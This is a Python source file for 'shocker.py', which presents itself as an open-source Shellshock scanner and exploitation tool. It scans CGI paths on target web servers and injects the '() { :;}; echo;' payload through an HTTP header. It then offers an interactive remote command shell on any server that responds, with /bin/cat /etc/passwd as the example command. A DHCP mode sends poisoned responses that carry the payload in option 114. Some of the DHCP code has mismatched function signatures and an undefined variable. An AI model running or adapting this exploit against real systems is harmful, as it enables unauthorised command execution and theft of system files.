#!/usr/bin/python

"""
shocker.py v0.8
A tool to find and exploit webservers vulnerable to Shellshock

##############################################################################
# Released as open source by NCC Group Plc - http://www.nccgroup.com/        #
#                                                                            #
# Developed by Tom Watson, tom.watson@nccgroup.com                           #
#                                                                            #
# http://www.github.com/nccgroup/shocker                                     #
#                                                                            #
# Released under the GNU Affero General Public License                       #
# (http://www.gnu.org/licenses/agpl-3.0.html)                                #
##############################################################################

Usage examples:
./shocker.py -M dhcp
Default dhcp attack - listens for Discover/Request/Info messages and returns 
poisoned responses

./shocker.py -M http -H 127.0.0.1 -e "/bin/cat /etc/passwd" -c /cgi-bin/test.cgi
Scans for http://127.0.0.1/cgi-bin/test.cgi and, if found, attempts to cat 
/etc/passwd

./shocker.py -M http -H www.example.com -p 8001 -s
Scan www.example.com on port 8001 using SSL for all scripts in cgi_list and
attempts the default exploit for any found

./shocker.py -M http -f iplist
Scans all hosts specified in the file ./iplist with default options

Read the README for more details
"""

import urllib2
import argparse
import string
import StringIO
import random
import signal
import sys
import socket
import Queue
import threading
import re
from collections import OrderedDict
from scapy.all import *   

# Wrapper object for sys.sdout to (try to) eliminate text buffering
# (http://stackoverflow.com/questions/107705/python-output-buffering)
class Unbuffered(object):
    def __init__(self, stream):
        self.stream = stream
    def write(self, data):
        self.stream.write(data)
        self.stream.flush()
    def __getattr__(self, attr):
        return getattr(self.stream, attr)

# Wrap std.out in Unbuffered
sys.stdout = Unbuffered(sys.stdout)

# DHCP Request Types
DHCP_REQUEST_TYPE = {
    1: "DHCPDISCOVER",
    2: "DHCPOFFER",
    3: "DHCPREQUEST",
    4: "DHCPDECLINE",
    5: "DHCPACK",
    6: "DHCPNAK",
    7: "DHCPRELEASE",
    8: "DHCPINFORM",
    9: "DHCPFORCERENEW",
    10: "DHCPLEASEQUERY",
    11: "DHCPLEASEUNASSIGNED",
    12: "DHCPLEASEUNKNOWN",
    13: "DHCPLEASEACTIVE",
    14: "DHCPBULKLEASEQUERY",
    15: "DHCPLEASEQUERYDONE"
    }

# Text descriptions of DHCP parameters
DHCP_PARAMETERS = {
    0: "Pad",
    1: "Subnet Mask",
    2: "Time Offset",
    3: "Router",
    4: "Time Server",
    5: "Name Server",
    6: "Domain Server",
    7: "Log Server",
    8: "Quotes Server",
    9: "LPR Server",
    10: "Impress Server",
    11: "RLP Server",
    12: "Hostname",
    13: "Boot File Size",
    14: "Merit Dump File",
    15: "Domain Name",
    16: "Swap Server",
    17: "Root Path",
    18: "Extension File",
    19: "Forward On/Off",
    20: "SrcRte On/Off",
    21: "Policy Filter",
    22: "Max DG Assembly",
    23: "Default IP TTL",
    24: "MTU Timeout",
    25: "MTU Plateau",
    26: "MTU Interface",
    27: "MTU Subnet",
    28: "Broadcast Address",
    29: "Mask Discovery",
    30: "Mask Supplier",
    31: "Router Discovery",
    32: "Router Request",
    33: "Static Route",
    34: "Trailers",
    35: "ARP Timeout",
    36: "Ethernet",
    37: "Default TCP TTL",
    38: "Keepalive Time",
    39: "Keepalive Data",
    40: "NIS Domain",
    41: "NIS Servers",
    42: "NTP Servers",
    43: "Vendor Specific",
    44: "NETBIOS Name Srv",
    45: "NETBIOS Dist Srv",
    46: "NETBIOS Node Type",
    47: "NETBIOS Scope",
    48: "X Window Font",
    49: "X Window Manager",
    50: "Address Request",
    51: "Address Time",
    52: "Overload",
    53: "DHCP Msg Type",
    54: "DHCP Server Id",
    55: "Parameter List",
    56: "DHCP Message",
    57: "DHCP Max Msg Size",
    58: "Renewal Time",
    59: "Rebinding Time",
    60: "Class Id",
    61: "Client Id",
    62: "NetWare/IP Domain",
    63: "NetWare/IP Option",
    64: "NIS-Domain-Name",
    65: "NIS-Server-Addr",
    66: "Server-Name",
    67: "Bootfile-Name",
    68: "Home-Agent-Addrs",
    69: "SMTP-Server",
    70: "POP3-Server",
    71: "NNTP-Server",
    72: "WWW-Server",
    73: "Finger-Server",
    74: "IRC-Server",
    75: "StreetTalk-Server",
    76: "STDA-Server",
    77: "User-Class",
    78: "Directory Agent",
    79: "Service Scope",
    80: "Rapid Commit",
    81: "Client FQDN",
    82: "Relay Agent Information",
    83: "iSNS",
    84: "REMOVED/Unassigned",
    85: "NDS Servers",
    86: "NDS Tree Name",
    87: "NDS Context",
    88: "BCMCS Controller Domain Name list",
    89: "BCMCS Controller IPv4 address option",
    90: "Authentication",
    91: "client-last-transaction-time option",
    92: "associated-ip option",
    93: "Client System",
    94: "Client NDI",
    95: "LDAP",
    96: "REMOVED/Unassigned",
    97: "UUID/GUID",
    98: "User-Auth",
    99: "GEOCONF_CIVIC",
    100: "PCode",
    101: "TCode",
    102: "REMOVED/Unassigned",
    103: "REMOVED/Unassigned",
    104: "REMOVED/Unassigned",
    105: "REMOVED/Unassigned",
    106: "REMOVED/Unassigned",
    107: "REMOVED/Unassigned",
    108: "REMOVED/Unassigned",
    109: "Unassigned",
    110: "REMOVED/Unassigned",
    111: "Unassigned",
    112: "Netinfo Address",
    113: "Netinfo Tag",
    114: "URL",
    115: "REMOVED/Unassigned",
    116: "Auto-Config",
    117: "Name Service Search",
    118: "Subnet Selection Option",
    119: "Domain Search",
    120: "SIP Servers DHCP Option",
    121: "Classless Static Route Option",
    122: "CCC",
    123: "GeoConf Option",
    124: "V-I Vendor Class",
    125: "V-I Vendor-Specific Information",
    126: "Removed/Unassigned",
    127: "Removed/Unassigned",
    128: "PXE - undefined (vendor specific)",
    129: "PXE - undefined (vendor specific)",
    130: "PXE - undefined (vendor specific)",
    131: "PXE - undefined (vendor specific)",
    132: "PXE - undefined (vendor specific)",
    133: "PXE - undefined (vendor specific)",
    134: "PXE - undefined (vendor specific)",
    135: "PXE - undefined (vendor specific)",
    136: "OPTION_PANA_AGENT",
    137: "OPTION_V4_LOST",
    138: "OPTION_CAPWAP_AC_V4",
    139: "OPTION-IPv4_Address-MoS",
    140: "OPTION-IPv4_FQDN-MoS",
    141: "SIP UA Configuration Service Domains",
    142: "OPTION-IPv4_Address-ANDSF",
    143: "Unassigned",
    144: "GeoLoc",
    145: "FORCERENEW_NONCE_CAPABLE",
    146: "RDNSS Selection",
    147: "Unassigned",
    148: "Unassigned",
    149: "Unassigned",
    150: "TFTP server address",
    151: "status-code",
    152: "base-time",
    153: "start-time-of-state",
    154: "query-start-time",
    155: "query-end-time",
    156: "dhcp-state",
    157: "data-source",
    158: "OPTION_V4_PCP_SERVER",
    159: "Unassigned",
    160: "Unassigned",
    161: "Unassigned",
    162: "Unassigned",
    163: "Unassigned",
    164: "Unassigned",
    165: "Unassigned",
    166: "Unassigned",
    167: "Unassigned",
    168: "Unassigned",
    169: "Unassigned",
    170: "Unassigned",
    171: "Unassigned",
    172: "Unassigned",
    173: "Unassigned",
    174: "Unassigned",
    175: "Etherboot",
    176: "IP Telephone",
    177: "Etherboot",
    177: "PacketCable and CableHome",
    178: "Unassigned",
    179: "Unassigned",
    180: "Unassigned",
    181: "Unassigned",
    182: "Unassigned",
    183: "Unassigned",
    184: "Unassigned",
    185: "Unassigned",
    186: "Unassigned",
    187: "Unassigned",
    188: "Unassigned",
    189: "Unassigned",
    190: "Unassigned",
    191: "Unassigned",
    192: "Unassigned",
    193: "Unassigned",
    194: "Unassigned",
    195: "Unassigned",
    196: "Unassigned",
    197: "Unassigned",
    198: "Unassigned",
    199: "Unassigned",
    200: "Unassigned",
    201: "Unassigned",
    202: "Unassigned",
    203: "Unassigned",
    204: "Unassigned",
    205: "Unassigned",
    206: "Unassigned",
    207: "Unassigned",
    208: "PXELINUX Magic",
    209: "Configuration File",
    210: "Path Prefix",
    211: "Reboot Time",
    212: "OPTION_6RD",
    213: "OPTION_V4_ACCESS_DOMAIN",
    214: "Unassigned",
    215: "Unassigned",
    216: "Unassigned",
    217: "Unassigned",
    218: "Unassigned",
    219: "Unassigned",
    220: "Subnet Allocation Option",
    221: "Virtual Subnet Selection (VSS) Option",
    222: "Unassigned",
    223: "Unassigned",
    224: "Reserved (Private Use)",
    225: "Reserved (Private Use)",
    226: "Reserved (Private Use)",
    227: "Reserved (Private Use)",
    229: "Reserved (Private Use)",
    230: "Reserved (Private Use)",
    231: "Reserved (Private Use)",
    232: "Reserved (Private Use)",
    233: "Reserved (Private Use)",
    234: "Reserved (Private Use)",
    235: "Reserved (Private Use)",
    236: "Reserved (Private Use)",
    237: "Reserved (Private Use)",
    238: "Reserved (Private Use)",
    239: "Reserved (Private Use)",
    240: "Reserved (Private Use)",
    241: "Reserved (Private Use)",
    242: "Reserved (Private Use)",
    243: "Reserved (Private Use)",
    244: "Reserved (Private Use)",
    245: "Reserved (Private Use)",
    246: "Reserved (Private Use)",
    247: "Reserved (Private Use)",
    248: "Reserved (Private Use)",
    249: "Reserved (Private Use)/Classless static route (Microsoft)",
    250: "Reserved (Private Use)",
    251: "Reserved (Private Use)",
    252: "Reserved (Private Use)/Proxy auto discovery",
    253: "Reserved (Private Use)",
    254: "Reserved (Private Use)",
    255: "End"
    }

# List of attack strings
ATTACKS = [
        "() { :;}; echo;"
   ]

# User-agent to use instead of 'Python-urllib/2.6' or similar
USER_AGENT = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"

# Handle CTRL-c elegently
def signal_handler(signal, frame):
    """ Try to catch and respond to CTRL-Cs
    """
    sys.exit(0)

# Timeout for urllib2.urlopen requests
TIMEOUT = 5

###################
#
# HTTP/S Attacks
#
###################
def do_http_attack(host_target_list, port, protocol, cgi_list, proxy, header, command, verbose):
    """ The main funtion for http (and https) attacks. Accepts arguments passed
    in from the command line and outputs to the command line.
    """
    # Check hosts resolve and are reachable on the chosen port
    confirmed_hosts = check_hosts(host_target_list, port, verbose)

    # Go through the cgi_list looking for any present on the target host
    if len(confirmed_hosts) > 0:
        target_list = scan_hosts(protocol, confirmed_hosts, port, cgi_list, proxy, verbose)
        # If any cgi scripts were found on the target host try to exploit them
        if len(target_list):
            successful_targets = do_exploit_cgi(proxy, target_list, header, command, verbose)
            if len(successful_targets):
                ask_for_console(proxy, successful_targets, verbose)
            else:
                print "[-] All exploit attempts failed"
        else:
            print "[+] No targets found to exploit"
    else:
        print "[-] No valid hosts provided"
def check_hosts(host_target_list, port, verbose):
    """ Do some basic sanity checking on hosts to make sure they resolve
    and are currently reachable on the specified port(s)
    """
    
    counter = 0
    number_of_targets = len (host_target_list)
    confirmed_hosts = [] # List of resoveable and reachable hosts
    if number_of_targets > 1:
        print "[+] Checking connectivity to targets..."
    else:
        print "[+] Checking connectivity with target..."
    for host in host_target_list:
        counter += 1
        # Show a progress bar unless verbose or there is only 1 host 
        if not verbose and number_of_targets > 1: 
            print_progress(number_of_targets, counter) 
        try:
            if verbose: print "[I] Checking to see if %s resolves..." % host
            ipaddr = socket.gethostbyname(host)
            if verbose: print "[I] Resolved ok"
            if verbose: print "[I] Checking to see if %s is reachable on port %s..." % (host, port)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5.0)
            s.connect((ipaddr, int(port)))
            s.close()
            if verbose: print "[I] %s seems reachable..." % host
            confirmed_hosts.append(host)
        except Exception as e:
            print "[!] Exception - %s: %s" % (host, e)
            print "[!] Omitting %s from target list..." % host
    if number_of_targets > 1:
        print "[+] %i of %i targets were reachable" % \
                            (len(confirmed_hosts), number_of_targets)
    elif len(confirmed_hosts) == 1:
        print "[+] Target was reachable"
    else:
        print "[+] Target unreachable"
    return confirmed_hosts


def scan_hosts(protocol, host_target_list, port, cgi_list, proxy, verbose):
    """ Checks to see if scripts contained in cgi_list are present (i.e. 
    return a 200 response from the server).
    Go through each potential cgi in cgi_list spinning up a thread for each
    check. Create Request objects for each check. 
    Return a list of cgi which exist and might be vulnerable
    """

    # List of potentially epxloitable URLs 
    exploit_targets = []
    cgi_num = len(cgi_list)
    q = Queue.Queue()
    threads = []
    
    for host in host_target_list:
        print "[+] Looking for vulnerabilities on %s:%s" % (host, port) 
        cgi_index = 0
        for cgi in cgi_list:
            cgi_index += 1

            # Show a progress bar unless verbose or there is only 1 cgi 
            if not verbose and cgi_num > 1: print_progress(cgi_num, cgi_index) 

            try:
                req = urllib2.Request(protocol + "://" + host + ":" + port + cgi)
                url = req.get_full_url()
                if proxy:
                    req.set_proxy(proxy, "http")    
                
                # Pretend not to be Python for no particular reason
                req.add_header("User-Agent", USER_AGENT)

                # Set the host header correctly (Python includes :port)
                req.add_header("Host", host)
                
                thread_pool.acquire()
                
                # Start a thread for each CGI in cgi_list
                if verbose: print "[I] Starting thread %i" % cgi_index
                t = threading.Thread(target = do_check_cgi, args = (req, q, verbose))
                t.start()
                threads.append(t)
            except Exception as e: 
                if verbose: print "[I] %s - %s" % (url, e) 
            finally:
                pass

        # Wait for all the threads to finish before moving on    
        for thread in threads:
            thread.join()
   
        # Pop any results from the Queue and add them to the list of potentially 
        # exploitable urls (exploit_targets) before returning that list
        while not q.empty():
            exploit_targets.append(q.get())
    
    if verbose: print "[+] Finished host scan"
    return exploit_targets


def do_check_cgi(req, q, verbose):
    """ Worker thread for scan_hosts to check if url is reachable
    """
    try:
        if urllib2.urlopen(req, None, TIMEOUT).getcode() == 200:
            q.put(req.get_full_url())
    except Exception as e:
        if verbose: print "[I] %s for %s" % (e, req.get_full_url()) 
    finally:
        thread_pool.release()
 

def do_exploit_cgi(proxy, target_list, header, command, verbose):
    """ For urls identified as potentially exploitable attempt to exploit
    """
    # Flag used to identify whether the exploit has successfully caused the
    # server to return a useful response
    success_flag = ''.join(
        random.choice(string.ascii_uppercase + string.digits
        ) for _ in range(20))
    
    # A dictionary of apparently successfully exploited targets
    # {index: (url, header, exploit)}
    # Returned to main() 
    successful_targets = OrderedDict()

    counter = 1

    if len(target_list) > 1:
        print "[+] %i potential targets found, attempting exploits..." % len(target_list)
    else:
        print "[+] 1 potential target found, attempting exploit..."
    for target in target_list:
        if verbose: print "[+] Trying exploit for %s" % target 
        if verbose: print "[I] Flag set to: %s" % success_flag
        for exploit in ATTACKS:
            attack = exploit + " echo " + success_flag + "; " + command
            result = do_attack(proxy, target, header, attack, verbose)
            if success_flag in result:
                if verbose: 
                    print "[!] %s looks vulnerable" % target 
                    print "[!] Response returned was:" 
                    buf = StringIO.StringIO(result)
                    if len(result) > (len(success_flag)):
                        for line in buf:
                            if line.strip() != success_flag: 
                                print "  %s" % line.strip()
                    else:
                        print "[!] A result was returned but was empty..."
                        print "[!] Maybe try a different exploit command?"
                    buf.close()
                successful_targets.update({counter: (target, 
                                                     header, 
                                                     exploit)})
		counter += 1
            else:
                if verbose: print "[-] Not vulnerable" 
    return successful_targets


def do_attack(proxy, target, header, attack, verbose):
    result = ""
    host = target.split(":")[1][2:] # substring host from target URL

    try:
        if verbose:
            print "[I] Header is: %s" % header
            print "[I] Attack string is: %s" % attack
        req = urllib2.Request(target)
        # User-Agent is overwritten if it is supplied as the attacker header
        req.add_header("User-Agent", USER_AGENT)
        req.add_header(header, attack)
        if proxy:
            req.set_proxy(proxy, "http")    
            if verbose: print "[I] Proxy set to: %s" % str(proxy)
        req.add_header("Host", host)
        resp = urllib2.urlopen(req, None, TIMEOUT)
        result =  resp.read()
    except Exception as e:
        if verbose: print "[I] %s - %s" % (target, e) 
    finally:
        pass
    return result


def ask_for_console(proxy, successful_targets, verbose):
    """ With any discovered vulnerable servers asks user if they
    would like to choose one of these to send further commands to
    in a semi interactive way
    successful_targets is a dictionary:
    {counter, (target, header, exploit)}
    """
    # Initialise to non zero to enter while loop
    user_input = 1
    while user_input is not 0:
        result = ""
        if len(successful_targets) > 1:
            print "[+] The following URLs appear to be exploitable:"
        else:
            print "[+] The following URL appears to be exploitable:"
        for x in range(len(successful_targets)):
            print "  [%i] %s" % (x+1, successful_targets[x+1][0])
        print "[+] Would you like to exploit further?"
        user_input = raw_input("[>] Enter an URL number or 0 to exit: ")
        sys.stdout.flush()
        try:
            user_input = int(user_input)
        except:
            continue
        if user_input not in range(len(successful_targets)+1):
            print "[-] Please enter a number between 1 and %i (0 to exit)" % \
                                                            len(successful_targets)
            continue
        elif not user_input:
            continue
        target = successful_targets[user_input][0]
        header = successful_targets[user_input][1]
	exploit = successful_targets[user_input][2]
        print "[+] Entering interactive mode for %s" % target
        print "[+] Enter commands (e.g. /bin/cat /etc/passwd) or 'quit'"

        while True:
            command = ""
            result = ""
            sys.stdout.flush()
            command = raw_input("  > ")
            sys.stdout.flush()
            if command == "quit":
                sys.stdout.flush()
                print "[+] Exiting interactive mode..."
                sys.stdout.flush()
                break
            if command:
                attack = successful_targets[user_input][2] + command
                result = do_attack(proxy, target, header, attack, verbose)
            else:
                result = ""
            if result: 
                buf = StringIO.StringIO(result)
                for line in buf:
                    sys.stdout.flush()
                    print "  < %s" % line.strip()
                    sys.stdout.flush()
            else:
                sys.stdout.flush()
                print "  > No response"
                sys.stdout.flush()


def validate_address(hostaddress):
    """ Attempt to identify if proposed host address is invalid by matching
    against some very rough regexes """
    singleIP_pattern = re.compile('^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$')
    FQDN_pattern = re.compile('^(\w+\.)*\w+$')
    if singleIP_pattern.match(hostaddress) or FQDN_pattern.match(hostaddress):
        return True 
    else:
        print "Host %s appears invalid, exiting..." % hostaddress
        exit(0)


def get_targets_from_file(file_name):
    """ Import targets to scan from file
    """
    host_target_list = []
    with open(file_name, 'r') as f:
        for line in f:
            line = line.strip()
            if not line.startswith('#') and validate_address(line):
                host_target_list.append(line)
    print "[+] %i hosts imported from %s" % (len(host_target_list), file_name)
    return host_target_list


def import_cgi_list_from_file(file_name):
    """ Import CGIs to scan from file
    """
    cgi_list = []
    with open(file_name, 'r') as f:
        for line in f:
            if not line.startswith('#'):
                cgi_list.append(line.strip())
    print "[+] %i potential targets imported from %s" % (len(cgi_list), file_name)
    return cgi_list


def print_progress(
                total,
                count,
                lbracket = "[",
                rbracket = "]",
                completed = ">",
                incomplete = "-",
                bar_size  = 50
                ): 
    percentage_progress = (100.0/float(total))*float(count)
    bar = int(bar_size * percentage_progress/100)
    print lbracket + completed*bar + incomplete*(bar_size-bar) + rbracket + \
        " (" + str(count).rjust(len(str(total)), " ") + "/" + str(total) + ")\r",
    if percentage_progress == 100: print "\n"


###################
#
# DHCP Attacks
#
###################
def do_dhcp_attack(command, IP, port):
    """ The main funtion for DHCP attacks. Accepts arguments passed in from the
    command line and outputs to the command line.
    """
    look_for_dhcp_servers()
    while True:
        print "[+] Waiting for DHCP requests..."
        sniff(filter="udp and (port 67 or port 68)", prn=process_dhcp(command, IP, port))


def look_for_dhcp_servers():
    """Send a DHCPDISCOVER message to Ethernet broadcast and listen for servers
    to respond
    INCOMPLETE - shocker will eventually behave differently according
    to whether or not it finds itself on a network with a live DHCP server
    I.e. Authority or proxy
    """
    print "[+] Looking for DHCP servers on the network, please wait..."
    conf.checkIPaddr = False
    fam,hw = get_if_raw_hwaddr(conf.iface)
    randxid = random.randrange(1, 4294967295)
    results = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/
            IP(src="0.0.0.0", dst="255.255.255.255")/
            UDP(sport=68, dport=67)/
            BOOTP(chaddr=hw, xid=randxid)/
            DHCP(options=[
                ("message-type","discover"),
                ("end"),
                ("pad"), ("pad"), ("pad"), ("pad"),
                ("pad"), ("pad"), ("pad"), ("pad"),
                ("pad"), ("pad"), ("pad"), ("pad"),
                ("pad"), ("pad"), ("pad"), ("pad"),
                ("pad"), ("pad"), ("pad"), ("pad"),
                ("pad"), ("pad"), ("pad"), ("pad"),
                ("pad"), ("pad"), ("pad"), ("pad"),
                ("pad"), ("pad"), ("pad"), ("pad"),
                ("pad"), ("pad"), ("pad"), ("pad"),
                ("pad"), ("pad"), ("pad"), ("pad"),
                ("pad"), ("pad"), ("pad"), ("pad"),
                ("pad"), ("pad"), ("pad"), ("pad"),
                ("pad"), ("pad"), ("pad"), ("pad"),
                ("pad"), ("pad"), ("pad"), ("pad"),
                ("pad"), ("pad"), ("pad"), ("pad"),
                ("pad"), ("pad"), ("pad"), ("pad")
                ]),
            verbose=0,
            timeout=30,
            multi=True
            )
    answered, unanswered = results
    result_size = len(answered)
    print "DEBUG results size is: %d" % result_size
    if result_size > 0:
        print "[I] Found: %d - shocker is DHCP proxy" % result_size
        answer = answered[0][1]
        print "[!] " + answer.command()
        print "[+] Server IP: %s" % answer[IP].src
        for option in answer[DHCP].options:
            if type(option) == tuple:
                print "[+] OPTION: " + str(option)
    else: print "[I] None found - shocker is DHCP authority"


def process_dhcp(command, port):
    def closed_process_dhcp(pkt):
        if pkt.haslayer('DHCP'):
            options = get_dhcp_options(pkt)
            request_type = DHCP_REQUEST_TYPE[options['message-type']] 
            requested_params = {}
            print request_type 
            print "DHCP options: %s" % str(options)
            if options.has_key('param_req_list'):
                requested_params = get_param_req_dict(options['param_req_list'])
                print "Parameters requested: %s" % str(requested_params).strip('[]')
            print "Command: %s" % str(pkt.command())
            if request_type == "DHCPDISCOVER" or \
                    request_type == "DHCPREQUEST" or \
                    request_type == "DHCPINFORM":
                print "[+] Recieved %s from %s/%s. Sending response..." % (request_type, pkt[Ether].src, pkt[IP].src)
                poison_dhcp_client(pkt, request_type, requested_params, command, port) 
        return closed_process_dhcp

def get_dhcp_options(pkt):
    """Return a dictonary to DHCP options from the DHCP packet supplied
    """
    option_dictionary = {}
    print "DEBUG - pkt: " + str(pkt) + str(type(pkt))
    for option in pkt[DHCP].options:
        if type(option) == tuple:
            k ,v = option
            option_dictionary[k] = v
    return option_dictionary


def get_param_req_dict(param_req_list):
    """
    Send an appropriate response to a client request with valid paramaters
    as well as a poinsoned DHCP option (currently hardcoded to 114/URL.
    """
    parameter_dictionary = {}
    for param in param_req_list:
        try:
            parameter_dictionary[ord(param)] = DHCP_PARAMETERS[ord(param)]
        except:
            parameter_dictionary[ord(param)] = "Unknown Option"
    return parameter_dictionary
    

def poison_dhcp_client(pkt, request_type, requested_params, command, port):
    """Send poisoned response to the client.
    <command> will be executed and if successful will be sent to udp <port> on the client 
    A good example command is /bin/cat /etc/passwd which will result in an attack_string
    of /bin/cat /etc/passwd>/dev/udp/[client's IP]/<port>
    """

    # TODO IF authoritative set sensible values and to be returned and match with 
    # current client IP address.
    # Else set values appropriate to existing DHCP server and check that client IP
    # address is sensible in relation to that (so that ponson reply can be routed by
    # the victim machine
    # Setup sniffer to capture and display responses

    #IP = ****get my IP address****
    attack_string = command + ">/dev/udp/" + IP + "/" + port
    print "DEBUG Here in poison" 
    if request_type == "DHCPDISCOVER":
        print "DEBUG: Sending DISCOVER response"
        print "pkt[Ether].src = %s" % str(pkt[Ether].src)
        reply = (Ether(src="00:12:12:12:12:12", dst=pkt[Ether].src)/
            IP(src="10.10.10.1", dst="255.255.255.255")/
            UDP(sport=67,dport=68)/
            BOOTP(
                op=2,
                yiaddr='10.10.10.57',
                siaddr='10.10.10.1',
                chaddr=pkt.chaddr,
                xid=pkt[BOOTP].xid
                )/
            DHCP(options=[
                    ('message-type', 2), 
                    ('server_id', '10.10.10.1'), 
                    ('lease_time', 18000), 
                    ('subnet_mask', '255.255.255.0'), 
                    ('router', '10.10.10.1'), 
                    ('name_server', '10.10.10.1'), 
                    ('domain', 'localdomain'), 
                    ('broadcast_address', '10.10.10.255'), 
                    (114, ATTACKS[0] + command),
                    'end', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad'
                    ]
                )
            )
        try:
            print reply.command()
            sendp(reply)
        except Exception as e:
            print e
    elif request_type == "DHCPREQUEST" or request_type == "DHCPINFORM":
        reply = (Ether(src="00:12:12:12:12:12", dst="ff:ff:ff:ff:ff:ff")/
            IP(src="10.10.10.1", dst="255.255.255.255")/
            UDP(sport=67,dport=68)/
            BOOTP(
                op=2,
                yiaddr='10.10.10.57',
                siaddr='10.10.10.1',
                giaddr='0.0.0.0',
                chaddr=pkt.chaddr,
                xid=pkt[BOOTP].xid
                )/
            DHCP(options=[
                    ('message-type', 5), 
                    ('server_id', '10.10.10.1'), 
                    ('lease_time', 18000), 
                    ('subnet_mask', '255.255.255.0'), 
                    ('router', '10.10.10.1'), 
                    ('name_server', '10.10.10.1'), 
                    ('domain', 'localdomain'), 
                    ('broadcast_address', '10.10.10.255'), 
                    (114, ATTACKS[0] + command),
                    'end', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad'
                    ]
                )
            )
        try:
            print reply.command()
            sendp(reply)
        except Exception as e:
            print e


def main():
    print """
   .-. .            .            
  (   )|            |            
   `-. |--. .-.  .-.|.-. .-. .--.
  (   )|  |(   )(   |-.'(.-' |   
   `-' '  `-`-'  `-''  `-`--''  v0.8 
   
 Tom Watson, tom.watson@nccgroup.com
 http://www.github.com/nccgroup/shocker
     
 Released under the GNU Affero General Public License
 (http://www.gnu.org/licenses/agpl-3.0.html)
    
    """ 
    
    # Handle CTRL-c elegently
    signal.signal(signal.SIGINT, signal_handler)

    # Handle command line argumemts
    parser = argparse.ArgumentParser(
        description='A Shellshock scanner and exploitation tool',
        epilog='Examples of use can be found in the README' 
        )
    parser.add_argument(
        '--Mode',
        '-M',
        choices=['http', 'dhcp'],
        type = str,
        default = "http",
        help = 'Attack mode (default=http)'
        )
    targets = parser.add_mutually_exclusive_group()
    targets.add_argument(
        '--Host',
        '-H',
        type = str,
        help = 'HTTP Mode - A target hostname or IP address'
        )
    targets.add_argument(
        '--file',
	'-f',
        type = str,
        help = 'HTTP Mode - File containing a list of targets'
        )
    cgis = parser.add_mutually_exclusive_group()
    cgis.add_argument(
        '--cgilist',
        type = str,
        default = './shocker-cgi_list',
               
        help = 'HTTP Mode - File containing a list of CGIs to try'
        )
    cgis.add_argument(
        '--cgi',
        '-c',
        type = str,
        help = "HTTP Mode - Single CGI to check (e.g. /cgi-bin/test.cgi)"
        )
    parser.add_argument(
        '--port',
        '-p',
        default = 80,
        type = int, 
        help = 'HTTP Mode - The target port number (default=80)'
        )
    parser.add_argument(
        '--command',
        default = "/bin/uname -a",
        help = "HTTP & DHCP Modes - Command to execute (default=/bin/uname -a)"
        )
    parser.add_argument(
        '--proxy', 
        help = "HTTP Mode - *A BIT BROKEN RIGHT NOW* Proxy to be used in the form 'ip:port'"
        )
    parser.add_argument(
        '--ssl',
        '-s',
        action = "store_true", 
        default = False,
        help = "HTTP Mode - Use SSL (default=False)"
        )
    parser.add_argument(
        '--header',
        default = "Content-type",
        help = "HTTP Mode - Header to use (default=Content-type)"
        )
    parser.add_argument(
        '--threads',
        '-t',
        type = int,
        default = 10,
        help = "HTTP Mode - Maximum number of threads (default=10, max=100)"
        )
    parser.add_argument(
        '--verbose',
        '-v',
        action = "store_true", 
        default = False,
        help = "Be verbose in output"
        )
    args = parser.parse_args()

    # Assign options to variables
    command = args.command
    if args.Mode == "dhcp":
        print "[+] DHCP ATTACK MODE SELECTED"
        do_dhcp_attack(command)
    elif args.Mode == "http":
        print "[+] HTTP ATTACK MODE SELECTED"
        if args.Host:
            host_target_list = [args.Host]
        elif args.file:
            host_target_list = get_targets_from_file(args.file)
        else:
            print "[-] Either a host or a file containing a list of hosts much be provided"
            exit(0)
        if not len(host_target_list) > 0:
            print "[-] No valid targets provided, exiting..."
            exit (0)
        port = str(args.port)
        header = args.header
        if args.proxy is not None:
            proxy = args.proxy
        else:
            proxy = ""
        verbose = args.verbose
        if args.ssl == True or port == "443":
            protocol = "https"
        else:
            protocol = "http"
        global thread_pool
        if args.threads > 100:
            print "Maximum number of threads is 100"
            exit(0) 
        else:
            thread_pool = threading.BoundedSemaphore(args.threads)
        if args.cgi is not None:
            cgi_list = [args.cgi]
            print "[+] Single target '%s' being used" % cgi_list[0]
        else:
            cgi_list = import_cgi_list_from_file(args.cgilist)
        do_http_attack(host_target_list, port, protocol, cgi_list, proxy, header, command, verbose)
    else:
        print "Unresognised attack type. Exiting..."
        exit(0)

__version__ = '0.8'
if __name__ == '__main__':
    main()
